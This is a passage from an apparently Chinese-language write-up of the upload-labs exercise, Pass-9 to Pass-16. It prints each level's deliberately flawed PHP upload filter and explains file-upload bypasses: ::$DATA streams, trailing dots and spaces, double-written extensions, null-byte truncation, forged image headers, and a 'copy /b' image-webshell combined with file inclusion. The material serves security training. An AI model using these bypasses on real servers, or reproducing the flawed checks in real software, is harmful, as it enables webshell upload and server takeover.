        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>对比发现，这一关没有过滤<code>::$DATA</code>，具体的含义可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52796034/article/details/132462264">::$DATA在文件解析漏洞中的妙用</a></p>
<pre><code class="hljs plaintext">::$DATA属性可以被恶意攻击者利用来隐藏恶意代码或数据。这种漏洞通常发生在应用程序或操作系统对文件解析和处理的过程中，攻击者通过构造特定的文件名或路径，使得应用程序在解析文件时错误地将::$DATA属性作为文件名的一部分，从而导致恶意代码或数据被执行或读取。</code></pre>
<p><strong>在php+windows的情况下：如果文件名+“::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA"之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：</strong></p>
<p>这里我们在上传文件后缀添加::$DATA即可，上传之后，访问即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202142320032.png" alt="image-20240202142320032"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202142257392.png" alt="image-20240202142257392"></p>
<p>tips：</p>
<ul>
<li>::$DATA属性对于普通用户来说是隐藏的</li>
<li>通常只有系统和一些特定的程序才能访问和使用它</li>
<li>对于普通用户来说</li>
<li>文件的数据是通过文件名来访问和操作的</li>
<li>而不需要直接访问::$DATA属性</li>
</ul>
<h2 id="pass-10">Pass-10</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>这一关涉及到了deldot函数特性：</p>
<pre><code class="hljs plaintext">deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来

我们利用该函数的特性修改后缀名为php. .这样最终执行完的结果为php.，成功绕过，我们进行抓包验证</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202142524949.png" alt="image-20240202142524949"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202142622323.png" alt="image-20240202142622323"></p>
<h2 id="pass-11">Pass-11</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>,<span class="hljs-string">"ini"</span>);

        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$file_name</span>);
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$file_name</span>;        
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>重点观察<code>$file_name = str_ireplace($deny_ext,"", $file_name);</code>即可知道双写绕过即可</p>
<h2 id="pass-12">Pass-12</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>)){
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)){
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
        }
    } <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;
    }
}</code></pre>
<p>这关查看源码发现对上传格式做了限制，这时想要绕过需要%00</p>
<p>例如：我们上传 1.php%00.jpg 时，首先后缀名是合法的jpg格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到%00字符认为这是终止符，于是丢弃后面的 .jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端。</p>
<pre><code>1.php&lt;5.3.4，并且关闭magic_quotes_gpc
2.文件上传路径可控
</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202143602127.png" alt="image-20240202143602127"></p>
<h2 id="pass-13">Pass-13</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>)){
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)){
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传失败"</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;
    }
}</code></pre>
<p>与上一关类似，只不过这一关是在post上面进行00截断</p>
<p><strong>注意：当url中的参数是通过GET方式获取时，%00会被自动解码。而当参数是通过POST方式获取时，是不会自动解码的，也就是说%00只会原样被当成字符串来输出。所以通过POST方式请求此类参数的时候，我们需要手动将它的十六进制改写为0x00</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202145637687.png" alt="image-20240202145637687"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202145617373.png" alt="image-20240202145617373"></p>
<h2 id="pass-14">Pass-14</h2>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{
    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">"rb"</span>);
    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">"C2chars"</span>, <span class="hljs-variable">$bin</span>);    
    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">'chars1'</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">'chars2'</span>]);    
    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">''</span>;    
    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>){      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">'jpg'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">'png'</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">'gif'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">'unknown'</span>;
        }    
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
}

<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getReailFileType</span>(<span class="hljs-variable">$temp_file</span>);

    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">'unknown'</span>){
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"文件未知，上传失败！"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">"/"</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.<span class="hljs-variable">$file_type</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)){
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传出错！"</span>;
        }
    }
}</code></pre>
<p>这一关的校验代码：<strong>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马：</strong></p>
<p><strong>cmd：copy 图片文件名/b + 一句话木马文件名/a 制作的图片马文件名</strong></p>
<p>制作好，打开之后如下图，说明制作成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202150638172.png" alt="image-20240202150638172"></p>
<p><strong>接下来我们用它的自带的文件包含漏洞解析该图片</strong>：</p>
<p><code>http://127.0.0.1/upload-labs/include.php?file=upload/1020230201072203.jpg</code></p>
<h2 id="pass-15">Pass-15</h2>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{
    <span class="hljs-variable">$types</span> = <span class="hljs-string">'.jpeg|.png|.gif'</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>)){
        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);
        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>){
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}

<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);
    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>){
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"文件未知，上传失败！"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">"/"</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-variable">$res</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)){
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传出错！"</span>;
        }
    }
}</code></pre>
<p>这一关采用了getimagesize函数校验：对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的，同上一关步骤一样。当然也可以直接抓包，在文件内容前面添加指定类型的文件头如：GIF89a等等</p>
<h2 id="pass-16">Pass-16</h2>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{
    <span class="hljs-comment">//需要开启php_exif模块</span>
    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);
    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) {
        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"gif"</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"jpg"</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"png"</span>;
            <span class="hljs-keyword">break</span>;    
        <span class="hljs-keyword">default</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">break</span>;
    }
}

<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
